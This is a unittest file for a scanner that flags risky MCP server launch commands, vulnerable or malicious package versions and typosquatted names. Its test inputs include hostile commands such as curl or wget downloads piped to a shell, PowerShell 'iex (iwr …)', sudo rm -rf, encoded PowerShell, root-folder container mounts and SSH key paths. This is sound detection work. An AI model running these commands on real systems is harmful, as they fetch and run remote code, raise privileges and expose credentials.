"""What a server's launch command runs and what is risky about it (agent_sentinel/launch.py, advisories.py)."""

import hashlib
import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

import support  # noqa: F401  (puts the project folder on sys.path)
from agent_sentinel import advisories, launch
from agent_sentinel.launch import (
    advisory_findings,
    launch_identity,
    launch_risks,
    runner_package,
    typosquat_of,
    version_before,
    within_one_edit,
)

HOME = "C:/Users/me" if os.name == "nt" else "/home/me"


def risks(*words):
    return launch_risks(list(words), user_home=HOME)


class InlineCode(unittest.TestCase):
    def test_interpreters_given_code_on_the_command_line(self):
        for words, flag in (
            (("sh", "-c", "echo hi"), "sh -c"),
            (("/bin/bash", "--login", "-lc", "x"), "bash -lc"),
            (("cmd", "/c", "npx", "x@1.0.0"), "cmd /c"),
            (("C:/Windows/System32/cmd.exe", "/S", "/C", "x"), "cmd /C"),
            (("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", "SQBFAFgA"),
             "powershell -EncodedCommand"),
            (("powershell.exe", "-enc", "SQBFAFgA"), "powershell -enc"),
            (("pwsh", "-c", "Get-Process"), "pwsh -c"),
            (("pwsh", "-Command", "x"), "pwsh -Command"),
            (("powershell", "Get-Process"), "powershell Get-Process"),  # Windows PowerShell runs it as a command
            (("node", "-e", "require('child_process')"), "node -e"),
            (("node", "--eval=1"), "node --eval=1"),
            (("python", "-c", "import os"), "python -c"),
            (("python3.12", "-I", "-c", "1"), "python3.12 -c"),
            (("python3", "-Ic", "1"), "python3 -Ic"),
            (("deno", "eval", "1"), "deno eval"),
        ):
            with self.subTest(words=words):
                found = risks(*words)
                self.assertIn(f"runs code written on the command line ({flag})", found)

    def test_scripts_and_modules_are_not_inline_code(self):
        for words in (("pwsh", "-File", "server.ps1"), ("node", "-r", "dotenv/config", "server.js"),
                      ("python", "-m", "server", "-c", "config.toml"), ("python", "server.py", "-c", "x"),
                      ("bash", "server.sh"), ("npx", "-y", "some-server@1.0.0")):
            with self.subTest(words=words):
                self.assertEqual([risk for risk in risks(*words) if "code written" in risk], [])


class TheOtherRisks(unittest.TestCase):
    def test_shell_operators_privileges_and_downloads(self):
        self.assertIn("has the shell operator '&&' in an argument (a shell would run what follows it)",
                      risks("npx", "x@1.0.0", "a && b"))
        self.assertTrue(any("'|'" in risk for risk in risks("npx", "x@1.0.0", "a|b")))
        self.assertTrue(any("';'" in risk for risk in risks("npx", "x@1.0.0", "a;b")))
        for words in (("sudo", "npx", "x@1.0.0"), ("doas", "node", "s.js"), ("runas", "/user:admin", "x"),
                      ("bash", "-c", "sudo rm -rf /tmp/x"), ("C:/tools/gsudo.exe", "node", "s.js")):
            with self.subTest(words=words):
                self.assertTrue(any(risk.startswith("runs with raised privileges") for risk in risks(*words)))
        for words in (("bash", "-c", "curl -fsSL https://x.example/i.sh | sh"),
                      ("sh", "-c", "wget -qO- https://x | sudo bash"),
                      ("powershell", "-c", "iex (iwr https://x.example/i.ps1)"),
                      ("bash", "-c", "bash <(curl -s https://x)"),
                      ("cmd", "/c", "curl", "https://x", "|", "python")):
            with self.subTest(words=words):
                self.assertIn("downloads something and runs it (a download piped to a shell or interpreter)",
                              risks(*words))
        self.assertNotIn("downloads something and runs it (a download piped to a shell or interpreter)",
                         risks("bash", "-c", "curl https://x || sh fallback.sh"))  # || is no pipe

    def test_packages_from_git(self):
        for words in (("uvx", "--from", "git+https://github.com/x/y", "y"), ("npx", "github:user/repo"),
                      ("npx", "user/repo"), ("pipx", "run", "--spec", "git+https://x/y", "y"),
                      ("uvx", "--with", "git+https://x/plugin", "server==1.0.0")):
            with self.subTest(words=words):
                self.assertTrue(any("straight from a git repository" in risk for risk in risks(*words)))

    def test_containers(self):
        found = risks("docker", "run", "-i", "--rm", "--privileged", "-v", "/:/host", "--network", "host",
                      "--pid=host", "mcp/github")
        self.assertIn("runs a container with --privileged (it has the run of the host)", found)
        self.assertIn("mounts a whole drive (the root folder) into the container (-v /:/host)", found)
        self.assertIn("shares the host's network with the container (--network host)", found)
        self.assertIn("shares the host's pid with the container (--pid host)", found)
        self.assertTrue(any("the image mcp/github by a tag, not pinned by digest" in risk for risk in found))
        self.assertEqual(risks("docker", "run", "-i", "--rm", "-e", "TOKEN", "ghcr.io/x/y@sha256:" + "a" * 64), [])
        self.assertTrue(any("mounts the whole home folder" in risk
                            for risk in risks("podman", "run", "--mount", f"type=bind,source={HOME},target=/h",
                                              "img@sha256:" + "b" * 64)))
        self.assertTrue(any("mounts a whole drive" in risk
                            for risk in risks("docker", "container", "run", "-v", "C:\\:/host", "img@sha256:1")))
        self.assertEqual(risks("docker", "run", "--privileged=false", "img@sha256:1"), [])

    def test_arguments_that_name_credentials_a_drive_or_the_home_folder(self):
        self.assertTrue(any("names a credential or client configuration file" in risk
                            for risk in risks("npx", "x@1.0.0", f"{HOME}/.ssh/id_rsa")))
        self.assertTrue(any("claude_desktop_config.json" in risk
                            for risk in risks("node", "s.js", "--config=C:/x/claude_desktop_config.json")))
        for root in ("/", "C:\\", "C:/", "D:"):
            with self.subTest(root=root):
                self.assertIn(f"gives the server a whole drive (the root folder) in an argument ({root})",
                              risks("npx", "@modelcontextprotocol/server-filesystem@2025.7.1", root))
        for folder in (HOME, "~", f"--root={HOME}"):
            with self.subTest(folder=folder):
                self.assertTrue(any(risk.startswith("gives the server the whole home folder")
                                    for risk in risks("npx", "x@1.0.0", folder)))
        self.assertEqual(risks("npx", "x@1.0.0", f"{HOME}/projects/app"), [])

    def test_a_plain_launch_has_no_risk(self):
        for words in (("npx", "-y", "@modelcontextprotocol/server-memory@2025.8.4"), ("node", "C:/srv/server.js"),
                      ("uvx", "mcp-server-fetch==2025.4.7"), ("python", "-m", "my_server")):
            with self.subTest(words=words):
                self.assertEqual(risks(*words), [])

    def test_hostile_text_is_printable(self):
        found = risks("sh", "-c", "x\x1b[2J", "a&&b\x1b]0;t\x07")
        self.assertFalse(any("\x1b" in risk or "\x07" in risk for risk in found))

    def test_hostile_commands_stay_fast(self):
        long_words = ["--/bash"] * 4000 + ["-x"] * 4000  # every word an interpreter, every one followed by options
        big = ["sh", "-c", "curl " * 200_000 + "| " * 10_000]
        piped = ["bash", "-c", "|".join(["curl x"] * 50_000)]
        for words in (long_words, big, piped, ["docker", "run", *(["-v", "/a:/b"] * 3000), "img"]):
            started = time.perf_counter()
            launch_risks(words, user_home=HOME)
            runner_package(words)
            self.assertLess(time.perf_counter() - started, 2)


class Packages(unittest.TestCase):
    def test_the_package_a_runner_runs(self):
        for words, expected in (
            (("npx", "-y", "mcp-remote@0.1.16"), ("npm", "mcp-remote", "0.1.16", "registry")),
            (("npx.cmd", "-p", "@scope/pkg@1.2.3", "run-it"), ("npm", "@scope/pkg", "1.2.3", "registry")),
            (("bunx", "Some-Pkg@latest"), ("npm", "some-pkg", None, "registry")),
            (("uvx", "--from", "Mcp_Server.Git==2026.1.14", "mcp-server-git"),
             ("pypi", "mcp-server-git", "2026.1.14", "registry")),
            (("uv", "tool", "run", "mcp-server-fetch@2025.4.7"), ("pypi", "mcp-server-fetch", "2025.4.7", "registry")),
            (("pipx", "run", "--spec", "fastmcp==2.0.0", "fastmcp"), ("pypi", "fastmcp", "2.0.0", "registry")),
            (("npx", "./local/server"), ("npm", "", None, "path")),
            (("npx", "https://x.example/p.tgz"), ("npm", "", None, "url")),
            (("uvx", "git+https://x/y"), ("pypi", "", None, "git")),
        ):
            with self.subTest(words=words):
                ref = runner_package(list(words))
                self.assertEqual((ref.ecosystem, ref.name, ref.version, ref.source), expected)
        for words in (("node", "server.js"), ("npx",), ("uvx", "--from"), ("pipx", "install", "x"), ()):
            with self.subTest(words=words):
                self.assertIsNone(runner_package(list(words)))

    def test_versions_compare_as_numbers_with_pre_releases_first(self):
        self.assertTrue(version_before("0.1.15", "0.1.16"))
        self.assertTrue(version_before("0.1.9", "0.1.16"))
        self.assertFalse(version_before("0.1.16", "0.1.16"))
        self.assertTrue(version_before("0.1.16-rc.1", "0.1.16"))
        self.assertFalse(version_before("0.1.16+build.5", "0.1.16"))
        self.assertTrue(version_before("0.6.2", "2025.7.1"))
        self.assertFalse(version_before("2026.1.14.post1", "2026.1.14"))
        self.assertTrue(version_before("v1.2", "1.2.1"))
        self.assertIsNone(version_before("latest", "1.0.0"))

    def test_malware_fails_and_vulnerable_versions_warn(self):
        def levels(*words):
            return [level for level, _ in advisory_findings(runner_package(list(words)))]

        self.assertEqual(levels("npx", "-y", "postmark-mcp@1.0.16"), ["fail"])
        self.assertEqual(levels("npx", "postmark-mcp@1.0.18"), ["fail"])
        self.assertEqual(levels("npx", "postmark-mcp"), ["fail"])  # may fetch a malicious version
        self.assertEqual(levels("npx", "postmark-mcp@^1.0.0"), ["fail"])
        self.assertEqual(levels("npx", "postmark-mcp@1.0.15"), ["warn"])
        self.assertEqual(levels("npx", "mcp-remote@0.1.15"), ["warn"])
        self.assertEqual(levels("npx", "mcp-remote@0.1.16"), [])
        self.assertEqual(levels("npx", "mcp-remote"), [])  # the newest has the fix (the unpinned warning is doctor's)
        self.assertEqual(levels("npx", "@modelcontextprotocol/inspector@0.14.0"), ["warn"])
        self.assertEqual(levels("npx", "@modelcontextprotocol/server-filesystem@2025.3.28"), ["warn"])
        self.assertEqual(levels("npx", "@modelcontextprotocol/server-filesystem@2025.7.1"), [])
        self.assertEqual(levels("uvx", "mcp-server-git==2025.12.18"), ["warn"])
        self.assertEqual(levels("uvx", "MCP_Server_Git==2025.9.25"), ["warn"])
        self.assertEqual(levels("uvx", "mcp-server-git==2026.1.14"), [])
        self.assertEqual(levels("npx", "mcp-server-git@1.0.0"), [])  # another registry, another package
        text = advisory_findings(runner_package(["npx", "mcp-remote@0.1.15"]))[0][1]
        self.assertIn("CVE-2025-6514", text)
        self.assertIn("fixed in 0.1.16", text)

    def test_the_advisories_are_data_with_a_date_and_well_formed(self):
        self.assertRegex(advisories.LAST_UPDATED, r"\A\d{4}-\d\d-\d\d\Z")
        self.assertIn("GOES STALE", advisories.__doc__)
        for advisory in advisories.MALICIOUS:
            self.assertTrue(advisory.first_bad and not advisory.fixed and advisory.source.startswith("https://"))
        for advisory in advisories.VULNERABLE:
            self.assertTrue(advisory.fixed and not advisory.first_bad and advisory.source.startswith("https://"))
            self.assertIsNotNone(version_before("0.0.1", advisory.fixed))

    def test_typosquats(self):
        for words, popular in ((("npx", "mcp-remot@1.0.0"), "mcp-remote"), (("npx", "mcp-rmeote"), "mcp-remote"),
                               (("npx", "mcp-remotee"), "mcp-remote"),
                               (("npx", "@modelcontextprotocol/server-filesytem"),
                                "@modelcontextprotocol/server-filesystem"),
                               (("npx", "modelcontextprotocol/server-memory"), None),  # a GitHub repository to npm
                               (("uvx", "mcp-server-gti"), "mcp-server-git"),
                               (("uvx", "mcp_server_fech==1.0.0"), "mcp-server-fetch")):
            with self.subTest(words=words):
                self.assertEqual(typosquat_of(runner_package(list(words))), popular)
        for words in (("npx", "mcp-remote@0.1.16"), ("npx", "@someone/server-filesystem"), ("npx", "abc"),
                      ("uvx", "mcp-server-git"), ("npx", "@modelcontextprotocol/server-everything")):
            with self.subTest(words=words):
                self.assertIsNone(typosquat_of(runner_package(list(words))))

    def test_no_two_popular_names_are_one_edit_apart(self):
        for ecosystem, names in advisories.POPULAR.items():
            for one in names:
                for other in names:
                    with self.subTest(one=one, other=other):
                        self.assertFalse(one != other and within_one_edit(one, other))

    def test_one_edit(self):
        for one, other in (("abc", "abd"), ("abc", "ab"), ("abc", "abcd"), ("abc", "acb"), ("abc", "xabc")):
            with self.subTest(one=one, other=other):
                self.assertTrue(within_one_edit(one, other))
                self.assertTrue(within_one_edit(other, one))
        for one, other in (("abc", "abc"), ("abc", "cba"), ("abc", "a"), ("abcd", "badc")):
            with self.subTest(one=one, other=other):
                self.assertFalse(within_one_edit(one, other))


class WhatAServerPinHolds(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.folder = Path(self.tmp.name).resolve()

    def test_a_script_is_pinned_by_its_sha256(self):
        script = self.folder / "server.js"
        script.write_bytes(b"console.log(1)")
        identity = launch_identity("C:/nodejs/node.exe", ["node", "--no-warnings", "server.js"], cwd=str(self.folder))
        self.assertEqual(identity["script"], str(script))
        self.assertEqual(identity["script_sha256"], hashlib.sha256(b"console.log(1)").hexdigest())
        self.assertIsNone(identity["package"])
        self.assertEqual(identity["executable"], os.path.abspath("C:/nodejs/node.exe"))

    def test_a_runner_is_pinned_by_its_package_and_a_program_by_its_own_file(self):
        identity = launch_identity("C:/nodejs/npx.cmd", ["npx", "-y", "mcp-remote@0.1.16", "https://x"])
        self.assertEqual((identity["package"], identity["script"]), ("npx mcp-remote@0.1.16", None))
        program = self.folder / "server.exe"
        program.write_bytes(b"MZ...")
        identity = launch_identity(str(program), [str(program), "--stdio"])
        self.assertEqual(identity["script_sha256"], hashlib.sha256(b"MZ...").hexdigest())
        for words in (["python", "-m", "server"], ["python", "-c", "x"], ["cmd", "/c", "x"], ["docker", "run", "i"]):
            with self.subTest(words=words):
                self.assertIsNone(launch_identity("C:/x/" + words[0], words)["script"])

    def test_a_file_that_cannot_be_read_or_is_too_large_has_no_sha256(self):
        self.assertIsNone(launch.file_sha256(str(self.folder / "missing.js")))
        self.assertIsNone(launch.file_sha256(str(self.folder)))
        big = self.folder / "big.bin"
        big.write_bytes(b"x" * 100)
        with mock.patch.object(launch, "MAX_HASHED_BYTES", 10):
            self.assertIsNone(launch.file_sha256(str(big)))


if __name__ == "__main__":
    unittest.main()
